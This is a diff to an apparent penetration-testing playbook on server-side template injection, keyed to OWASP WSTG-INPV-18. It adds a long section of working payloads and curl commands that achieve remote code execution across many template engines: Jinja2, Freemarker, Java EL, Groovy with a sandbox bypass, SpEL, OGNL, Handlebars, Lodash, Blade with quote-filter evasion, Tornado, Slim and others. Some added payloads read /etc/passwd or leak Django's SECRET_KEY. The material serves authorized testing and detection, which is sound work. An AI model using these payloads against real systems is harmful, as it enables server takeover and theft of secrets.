@@ -8,8 +8,8 @@ author: cyberstrike-official
 tags: [injection, input-validation, xss, sqli, wstg, inpv]
 tech_stack: []
 cwe_ids: []
-chains_with: []
-prerequisites: []
+chains_with: [wstg-inpv-01, wstg-inpv-02]
+prerequisites: [wstg-conf-01, wstg-conf-02]
 severity_boost: {}
 ---
 
@@ -326,6 +326,187 @@ ${product.getClass().getProtectionDomain().getCodeSource().getLocation()}
 
 ---
 
+## Example Commands/Payloads
+
+```bash
+# Universal detection (math evaluates to 49 if vulnerable)
+curl -s "https://{target}/page?name=%7B%7B7*7%7D%7D"        # {{7*7}}
+curl -s "https://{target}/page?name=%24%7B7*7%7D"           # ${7*7}
+curl -s "https://{target}/page?name=%3C%25%3D+7*7+%25%3E"   # <%= 7*7 %>
+
+# Jinja2 RCE
+curl -s "https://{target}/page?name=%7B%7Bconfig.__class__.__init__.__globals__%5B%27os%27%5D.popen(%27id%27).read()%7D%7D"
+
+# Freemarker RCE
+curl -s "https://{target}/page?name=%3C%23assign+ex%3D%22freemarker.template.utility.Execute%22%3Fnew()%3E%24%7Bex(%22id%22)%7D"
+```
+
+| Payload | Engine | Detection Pattern |
+| --- | --- | --- |
+| `{{7*7}}` | Jinja2/Twig | Response contains `49` (payload not reflected literally) |
+| `${7*7}` | Freemarker/Mako | Response contains `49` |
+| `<%= 7*7 %>` | ERB | Response contains `49` |
+| `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` | Jinja2 RCE | `uid=` in response |
+| `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` | Freemarker RCE | `uid=` in response |
+
+### Universal Polyglot Detection (triggers an error across nearly every engine)
+
+```bash
+curl -s "https://{target}/page?name=%24%7B%7B%3C%25%5B%25%27%22%7D%7D%25%5C." # ${{<%[%'"}}%\.
+```
+
+### Error-Based Detection (leaks the backend language from a division-by-zero error)
+
+```bash
+curl -s "https://{target}/page?name=%7B%7B(1%2F0).zxy.zxy%7D%7D"   # {{(1/0).zxy.zxy}}
+```
+
+| Error string in response | Language |
+| --- | --- |
+| `ZeroDivisionError` | Python |
+| `java.lang.ArithmeticException` | Java |
+| `ReferenceError` / `TypeError` | NodeJS |
+| `Division by zero` / `DivisionByZeroError` | PHP |
+| `divided by 0` | Ruby |
+| `Arithmetic operation failed` | Freemarker (Java) |
+
+### Boolean-Based Blind Pairs (for engines that hide errors but expose behavior diffs)
+
+```bash
+# Pair 1: valid expr vs syntax error
+curl -s "https://{target}/page?name=%7B%7B(3*4%2F2)%7D%7D"     # {{(3*4/2)}}  -> renders "6"
+curl -s "https://{target}/page?name=%7B%7B3*)2(%2F4%7D%7D"     # {{3*)2(/4}}  -> triggers error/blank
+```
+
+Automated scanners: `Hackmanit/TInjA` (polyglot-based, JS/error/boolean aware), `epinna/tplmap`, `vladko312/SSTImap`.
+
+### ASP.NET Razor
+
+```bash
+curl -s "https://{target}/page?name=%40(7*7)"   # @(7*7) -> 49
+```
+
+| Payload | Purpose |
+| --- | --- |
+| `@(1+2)` | Basic detection — renders `3` |
+| `@{ /* C# or VB.NET code */ }` | Code block — arbitrary C#/VB.NET statements execute server-side (full RCE, since Razor code blocks are compiled and run with the app's privileges) |
+
+### Elixir (EEx / LEEx / HEEx)
+
+```erlang
+<%= 7 * 7 %>                                              # Basic detection
+<%= File.read!("/etc/passwd") %>                          # Arbitrary file read
+<%= elem(System.shell("id"), 0) %>                        # Rendered RCE
+<%= [1, 2][elem(System.shell("id"), 0)] %>                # Error-Based RCE
+<%= 1/((elem(System.shell("id"), 1) == 0)&&1||0) %>       # Boolean-Based RCE
+<%= elem(System.shell("id && sleep 5"), 0) %>              # Time-Based RCE
+```
+
+Same payloads (without the `<%= %>` wrapper) also work for LEEx and HEEx when EEx is used as their replacement engine.
+
+### Java — Additional Engines (Java EL, Jinjava, Groovy, SpEL, OGNL)
+
+Freemarker, Velocity, Pebble and Thymeleaf payloads are covered above; these are other common JVM expression/template languages.
+
+```java
+// Java EL — detection and RCE
+${7*7}
+${{7*7}}
+${''.getClass().forName('java.lang.String').getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').inputStream.readAllBytes())}
+
+// Jinjava (HubSpot, Java-based Jinja-like syntax) — fixed in HubSpot/jinjava PR #230, still found on old versions
+{{'a'.toUpperCase()}}
+{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"id\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
+
+// Groovy
+${9*9}
+${"calc.exe".execute()}
+${new File('/etc/passwd').text}
+${@ASTTest(value={assert java.lang.Runtime.getRuntime().exec("id")}) def x}   // sandbox bypass via AST annotation
+
+// Spring Expression Language (SpEL)
+${7*7}
+${T(java.lang.System).getenv()}
+${T(java.lang.Runtime).getRuntime().exec('id')}
+
+// Object-Graph Navigation Language (OGNL) — no braces needed, injected raw or inside ${ }
+7*7
+new String(@java.lang.Runtime@getRuntime().exec("id").getInputStream().readAllBytes())
+```
+
+### JavaScript / Node.js
+
+| Template Name | Payload Format |
+| --- | --- |
+| EJS, DotJS, UnderscoreJS, Eta, PugJS | `<% %>` / `#{ }` |
+| HandlebarsJS, HoganJS, MustacheJS, NunjucksJS, TwigJS, VueJS | `{{ }}` |
+| Lodash | `{{= }}` |
+
+```javascript
+// Universal NodeJS RCE — works for EJS, DotJS, PugJS, UnderscoreJS, Eta (wrap in the engine's tag)
+global.process.mainModule.require("child_process").execSync("id").toString()                                  // Rendered RCE
+global.process.mainModule.require("Y:/A:/"+global.process.mainModule.require("child_process").execSync("id").toString()) // Error-Based RCE
+[""][0 + !(global.process.mainModule.require("child_process").spawnSync("id", {shell:true}).status===0)]["length"]        // Boolean-Based RCE
+global.process.mainModule.require("child_process").execSync("id && sleep 5").toString()                       // Time-Based RCE
+
+// NunjucksJS specific
+{{range.constructor(' return global.process.mainModule.require("child_process").execSync("id") ')()}}
+
+// Handlebars (<4.1.2, <4.0.14, <3.0.7 — GHSA-q42p-pg8m-cqh6)
+{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').execSync('id');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}
+
+// Lodash — delimiter depends on options.evaluate, try all three
+{{= _.VERSION}}
+${= _.VERSION}
+<%= _.VERSION %>
+{{x=Object}}{{w=a=new x}}{{w.type="pipe"}}{{w.readable=1}}{{w.writable=1}}{{a.file="/bin/sh"}}{{a.args=["/bin/sh","-c","id"]}}{{a.stdio=[w,w]}}{{process.binding("spawn_sync").spawn(a).output}}
+
+// Pug
+#{root.process.mainModule.require('child_process').spawnSync('id', []).stdout}
+```
+
+### PHP — Additional Engines (Blade, Latte)
+
+Twig and Smarty payloads are covered above; the generic PHP universal payloads work on Blade and Latte too.
+
+```php
+// Blade (Laravel) — string "id" built from chr() to avoid quote filtering
+{{passthru(implode(null,array_map(chr(99).chr(104).chr(114),[105,100])))}}
+
+// Latte
+{var $X="POC"}{$X}
+{php system('id')}
+```
+
+### Python — Additional Engines (Django Templates, Tornado)
+
+Jinja2 and Mako payloads are covered above.
+
+```python
+# Django Template Language (much more restricted than Jinja2 — no function calls)
+{% csrf_token %}                     # Errors on Jinja2, confirms Django Templates
+ih0vr{{364|add:733}}d121r            # Arithmetic without `*` -> ih0vr1097d121r
+{% debug %}                          # Debug information leak
+{{ messages.storages.0.signer.key }} # Leaks Django's SECRET_KEY
+{% include 'admin/base.html' %}      # Confirms/leaks admin site URL
+
+# Tornado
+{{7*7}}
+{{os.system('id')}}
+{%import os%}{{os.system('id')}}
+```
+
+### Ruby — Additional Engine (Slim)
+
+ERB, Erubi and Erubis payloads are covered above.
+
+```ruby
+#{ 7 * 7 }        # Slim - basic detection
+#{ %x|id| }       # Slim - RCE
+```
+
+---
+
 ## Remediation
 
 ```python
@@ -365,6 +546,13 @@ cfg.setNewBuiltinClassResolver(TemplateClassResolver.ALLOWS_NOTHING_RESOLVER);
 | ------------ | --------------------------------------------------------------------- |
 | **CWE-1336** | Improper Neutralization of Special Elements Used in a Template Engine |
 
+
+---
+
+## References
+
+- [OWASP WSTG - WSTG-INPV-18: Testing for Server-side Template Injection](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection)
+- [PayloadsAllTheThings - Server Side Template Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
 
 ---
 
